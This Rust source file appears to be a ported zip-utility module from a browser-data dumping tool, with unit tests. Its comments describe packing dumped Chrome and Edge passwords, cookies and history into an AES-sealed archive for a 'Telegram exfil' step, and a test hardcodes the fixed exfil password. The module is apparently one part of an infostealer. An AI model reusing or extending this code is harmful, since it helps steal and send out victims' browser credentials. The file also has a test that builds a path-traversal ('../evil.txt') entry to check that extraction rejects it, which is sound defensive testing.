//! Port of Go `utils/fileutil/fileutil.go` — zip helpers.
//!
//! Three functions, one per Go entry point:
//!
//! - [`compress_dir`] — `CompressDir`: pack a directory into `<dir>/<base>.zip`
//!   and delete the originals (Go deletes each file as it is added).
//!   **Deviation (documented):** Go reads the top level only and flattens entry
//!   names to basenames; since the output writer now uses the profile-split
//!   layout `<dir>/<browser>/<profile>/<file>`, this port walks recursively and
//!   preserves the relative layout with forward-slash names. The "delete
//!   originals" behavior is kept.
//! - [`zip_dir`] — `ZipDir`: non-destructive archive of every file under a
//!   directory, preserving relative paths (producer side of `archive`).
//! - [`unzip`] — `Unzip`: extract into a directory, rejecting any entry whose
//!   path would escape it (Zip-Slip), since transported archives are untrusted.

use std::fs;
use std::io::{self, Write};
use std::path::{Path, PathBuf};

use zip::write::SimpleFileOptions;
use zip::{AesMode, CompressionMethod, ZipArchive, ZipWriter};

/// Deflate compression for created archives — Go `archive/zip`'s `Create`
/// default (Store is never produced by any of these helpers). When a
/// `password` is supplied, every entry is additionally sealed with AES-256
/// (WinZip convention — the standard unzip tools prompt for the password).
fn options(password: Option<&str>) -> SimpleFileOptions {
    let o = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
    match password {
        // `FileOptions` borrows the password for its lifetime (`'static` here),
        // so the constant exfil secret is leaked once — a small process-lifetime
        // string, fine for a fixed archive password.
        Some(p) => o.with_aes_encryption(AesMode::Aes256, leak_string(p)),
        None => o,
    }
}

/// Promote a caller-owned password to `'static` so `SimpleFileOptions` can
/// hold it. Called once per archive.
fn leak_string(pw: &str) -> &'static str {
    Box::leak(pw.to_string().into_boxed_str())
}

/// Checks whether `filename` exists and is a regular file (Go: `FileExists`).
pub fn file_exists(filename: &Path) -> bool {
    match fs::metadata(filename) {
        Ok(m) => m.is_file(),
        Err(_) => false,
    }
}

/// Go `CompressDir` — see the module docs for the recursive-layout deviation.
pub fn compress_dir(dir: &Path, password: Option<&str>) -> Result<(), ZipError> {
    let files = walk_files(dir)?;
    if files.is_empty() {
        return Err(ZipError::Message(format!(
            "no files to compress in: {}",
            dir.display()
        )));
    }

    let base = dir
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_else(|| "output".to_string());
    let zip_path = dir.join(format!("{base}.zip"));
    let out = fs::File::create(&zip_path).map_err(|e| {
        ZipError::io(
            format!("error creating output file {}", zip_path.display()),
            e,
        )
    })?;

    let mut zw = ZipWriter::new(out);
    for rel in &files {
        let abs = dir.join(rel);
        let content = fs::read(&abs)
            .map_err(|e| ZipError::io(format!("error reading file {}", abs.display()), e))?;
        zw.start_file(rel.to_string_lossy().replace('\\', "/"), options(password))
            .map_err(ZipError::from_zip)?;
        zw.write_all(&content).map_err(|e| {
            ZipError::io(
                format!("error writing content to zip for {}", abs.display()),
                e,
            )
        })?;
        // Go removes each source file as it is added.
        fs::remove_file(&abs).map_err(|e| {
            ZipError::io(format!("error removing original file {}", abs.display()), e)
        })?;
    }
    let mut zf = zw.finish().map_err(ZipError::from_zip)?;
    zf.flush()
        .map_err(|e| ZipError::io("error writing data to file", e))?;
    Ok(())
}

/// Go `ZipDir` — every file under `src_dir` into a new zip at `zip_path`,
/// forward-slash relative entry names, source untouched. `password` seals the
/// archive with AES-256 (used for the Telegram exfil zip).
pub fn zip_dir(zip_path: &Path, src_dir: &Path, password: Option<&str>) -> Result<(), ZipError> {
    let out = fs::File::create(zip_path)
        .map_err(|e| ZipError::io(format!("create {}", zip_path.display()), e))?;
    let mut zw = ZipWriter::new(out);

    let files = walk_files(src_dir)?;
    for rel in &files {
        let abs = src_dir.join(rel);
        zw.start_file(rel.to_string_lossy().replace('\\', "/"), options(password))
            .map_err(ZipError::from_zip)?;
        let mut src =
            fs::File::open(&abs).map_err(|e| ZipError::io(format!("open {}", abs.display()), e))?;
        io::copy(&mut src, &mut zw)
            .map_err(|e| ZipError::io(format!("zip {}", src_dir.display()), e))?;
    }
    zw.finish().map_err(ZipError::from_zip)?;
    Ok(())
}

/// Go `Unzip` — extract `zip_path` into `dest_dir`; rejects zip-slip entries.
pub fn unzip(zip_path: &Path, dest_dir: &Path) -> Result<(), ZipError> {
    let file = fs::File::open(zip_path)
        .map_err(|e| ZipError::io(format!("open zip {}", zip_path.display()), e))?;
    let mut arc = ZipArchive::new(file).map_err(ZipError::from_zip)?;

    let root = canonicalize_opt(dest_dir)?;
    for i in 0..arc.len() {
        let mut entry = arc.by_index(i).map_err(ZipError::from_zip)?;
        let name = entry.name().to_string();
        let target = match entry.enclosed_name() {
            Some(p) => root.join(p),
            None => {
                return Err(ZipError::Message(format!(
                    "zip entry {:?} escapes destination",
                    name
                )));
            }
        };
        if entry.is_dir() {
            fs::create_dir_all(&target)
                .map_err(|e| ZipError::io(format!("mkdir {}", target.display()), e))?;
            continue;
        }
        if let Some(parent) = target.parent() {
            fs::create_dir_all(parent)
                .map_err(|e| ZipError::io(format!("mkdir {}", parent.display()), e))?;
        }
        let mut out = fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .open(&target)
            .map_err(|e| ZipError::io(format!("create {}", target.display()), e))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = out.set_permissions(fs::Permissions::from_mode(0o600));
        }
        io::copy(&mut entry, &mut out)
            .map_err(|e| ZipError::io(format!("write {}", target.display()), e))?;
    }
    Ok(())
}

/// Recursively lists regular files under `dir`, relative to it.
///
/// `.zip` entries are skipped: compressing a dump dir into a zip must never
/// re-archive another archive that happens to live beside it (a `--zip` run
/// leaves `<dir>/<base>.zip`, and the Telegram exfil then re-packs `dir`).
fn walk_files(dir: &Path) -> Result<Vec<PathBuf>, ZipError> {
    let mut files = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        let entries = fs::read_dir(&d).map_err(|e| ZipError::io("read dir error", e))?;
        for e in entries {
            let e = e.map_err(|e| ZipError::io("read dir error", e))?;
            let p = e.path();
            if p.is_dir() {
                stack.push(p);
            } else if p.extension().is_some_and(|x| x.eq_ignore_ascii_case("zip")) {
                continue;
            } else {
                files.push(p);
            }
        }
    }
    // Convert to paths relative to `dir` (Go: `filepath.Rel`).
    let rel = files
        .iter()
        .map(|p| {
            p.strip_prefix(dir)
                .map(PathBuf::from)
                .map_err(|e| ZipError::Message(format!("rel path: {e}")))
        })
        .collect::<Result<Vec<_>, _>>()?;
    Ok(rel)
}

/// Canonicalizes `dest_dir` so the zip-slip prefix check is airtight even when
/// `dest_dir` is relative (Go: `filepath.Clean` + join + prefix compare).
fn canonicalize_opt(dir: &Path) -> Result<PathBuf, ZipError> {
    match fs::canonicalize(dir) {
        Ok(p) => Ok(p),
        Err(_) => {
            // Dest may not exist yet; canonicalize the deepest existing ancestor.
            let mut cur = dir.to_path_buf();
            let mut suffix = Vec::new();
            loop {
                match fs::canonicalize(&cur) {
                    Ok(root) => {
                        let mut out = root;
                        for s in suffix.iter().rev() {
                            out.push(s);
                        }
                        return Ok(out);
                    }
                    Err(_) => match cur.file_name() {
                        Some(name) => {
                            suffix.push(name.to_os_string());
                            cur.pop();
                        }
                        None => {
                            return Err(ZipError::io(
                                "canonicalize destination",
                                io::Error::new(io::ErrorKind::NotFound, "no ancestor exists"),
                            ));
                        }
                    },
                }
            }
        }
    }
}

/// Errors from the zip helpers (Go: plain `error`s).
#[derive(Debug, thiserror::Error)]
pub enum ZipError {
    #[error("{message}: {source}")]
    Io {
        message: String,
        source: std::io::Error,
    },
    #[error("{0}")]
    Message(String),
}

impl ZipError {
    fn io(message: impl Into<String>, source: std::io::Error) -> Self {
        ZipError::Io {
            message: message.into(),
            source,
        }
    }

    fn from_zip(e: zip::result::ZipError) -> Self {
        match e {
            zip::result::ZipError::Io(io) => ZipError::Io {
                message: "zip entry".into(),
                source: io,
            },
            other => ZipError::Message(other.to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "lemon-zip-{}-{tag}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn file_exists_checks_regular_file() {
        let dir = temp_dir("exists");
        let f = dir.join("a.txt");
        fs::write(&f, "x").unwrap();
        assert!(file_exists(&f));
        assert!(!file_exists(&dir));
        assert!(!file_exists(&dir.join("missing")));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn compress_dir_recurses_and_removes_originals() {
        let dir = temp_dir("compress");
        fs::create_dir_all(dir.join("Chrome/Default")).unwrap();
        fs::create_dir_all(dir.join("Edge/Default")).unwrap();
        fs::write(dir.join("Chrome/Default/password.csv"), "browser\n").unwrap();
        fs::write(dir.join("Chrome/Default/cookie.csv"), "host\n").unwrap();
        fs::write(dir.join("Edge/Default/history.csv"), "url\n").unwrap();

        compress_dir(&dir, None).unwrap();

        // originals deleted, zip present with preserved relative layout
        assert!(!dir.join("Chrome/Default/password.csv").exists());
        let zip_path = dir.join(format!(
            "{}.zip",
            dir.file_name().unwrap().to_string_lossy()
        ));
        assert!(zip_path.exists());

        let out = temp_dir("compress-out");
        unzip(&zip_path, &out).unwrap();
        assert_eq!(
            "browser\n",
            fs::read_to_string(out.join("Chrome/Default/password.csv")).unwrap()
        );
        assert_eq!(
            "url\n",
            fs::read_to_string(out.join("Edge/Default/history.csv")).unwrap()
        );
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn compress_dir_empty_errors() {
        let dir = temp_dir("compress-empty");
        let err = compress_dir(&dir, None).unwrap_err();
        assert!(err.to_string().contains("no files to compress"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn zip_dir_preserves_sources() {
        let dir = temp_dir("zipdir");
        fs::create_dir_all(dir.join("sub")).unwrap();
        fs::write(dir.join("sub/a.txt"), "hello").unwrap();
        let zip_path = dir.join("out.zip");

        zip_dir(&zip_path, &dir, None).unwrap();
        assert!(
            dir.join("sub/a.txt").exists(),
            "ZipDir must not delete sources"
        );

        let out = temp_dir("zipdir-out");
        unzip(&zip_path, &out).unwrap();
        assert_eq!("hello", fs::read_to_string(out.join("sub/a.txt")).unwrap());
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn zip_dir_aes_password_round_trips() {
        use std::io::Read;

        let dir = temp_dir("aes");
        fs::create_dir_all(dir.join("Chrome/Default")).unwrap();
        fs::write(dir.join("Chrome/Default/password.csv"), "browser\n").unwrap();
        let zip_path = dir.join("save-enc.zip");

        zip_dir(&zip_path, &dir, Some("khongyeuemthiyeuai@999")).unwrap();

        // Sealed: reading without the password must not yield plaintext.
        let mut arc = ZipArchive::new(fs::File::open(&zip_path).unwrap()).unwrap();
        let mut sealed = Vec::new();
        let read_unpass = match arc.by_index(0) {
            Ok(mut e) => e.read_to_end(&mut sealed).is_err(),
            Err(_) => true,
        };
        assert!(
            read_unpass,
            "AES entry must not decrypt without the password"
        );

        // Password-decrypt read yields the exact original content.
        let mut arc = ZipArchive::new(fs::File::open(&zip_path).unwrap()).unwrap();
        let mut e = arc.by_index_decrypt(0, b"khongyeuemthiyeuai@999").unwrap();
        let mut buf = Vec::new();
        e.read_to_end(&mut buf).unwrap();
        assert_eq!(buf, b"browser\n");

        // A wrong password must fail.
        let mut arc = ZipArchive::new(fs::File::open(&zip_path).unwrap()).unwrap();
        assert!(
            arc.by_index_decrypt(0, b"wrong-password").is_err(),
            "wrong password must fail decryption"
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn zip_dir_skips_sibling_archives() {
        // A `--zip` run leaves `<dir>/<base>.zip` beside the dump; re-packing
        // that dir must not nest the sibling zip inside the new archive.
        let dir = temp_dir("nested");
        fs::create_dir_all(dir.join("Chrome/Default")).unwrap();
        fs::write(dir.join("Chrome/Default/password.csv"), "browser\n").unwrap();
        fs::write(dir.join("old-archive.zip"), "not a real zip, name matters").unwrap();

        let zip_path = dir.join("save-alice.zip");
        zip_dir(&zip_path, &dir, None).unwrap();

        let out = temp_dir("nested-out");
        unzip(&zip_path, &out).unwrap();
        assert_eq!(
            "browser\n",
            fs::read_to_string(out.join("Chrome/Default/password.csv")).unwrap()
        );
        let names = list_rel(&out);
        assert!(
            !names.iter().any(|n| n.ends_with(".zip")),
            "archive must not contain another archive: {names:?}"
        );
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&out);
    }

    fn list_rel(dir: &Path) -> Vec<String> {
        let mut names = Vec::new();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(d) = stack.pop() {
            for e in fs::read_dir(&d).unwrap() {
                let p = e.unwrap().path();
                if p.is_dir() {
                    stack.push(p);
                } else {
                    names.push(
                        p.strip_prefix(dir)
                            .unwrap()
                            .to_string_lossy()
                            .replace('\\', "/"),
                    );
                }
            }
        }
        names
    }

    #[test]
    fn unzip_rejects_zip_slip() {
        let dir = temp_dir("slip");
        let zip_path = dir.join("evil.zip");
        let out = dir.join("out");

        // Build a zip containing a `../` entry by hand.
        let f = fs::File::create(&zip_path).unwrap();
        let mut zw = ZipWriter::new(f);
        zw.start_file("../evil.txt", options(None)).unwrap();
        zw.write_all(b"pwn").unwrap();
        zw.finish().unwrap();

        let err = unzip(&zip_path, &out).unwrap_err();
        assert!(err.to_string().contains("escapes destination"), "{err}");
        assert!(!dir.join("evil.txt").exists());
        let _ = fs::remove_dir_all(&dir);
    }
}
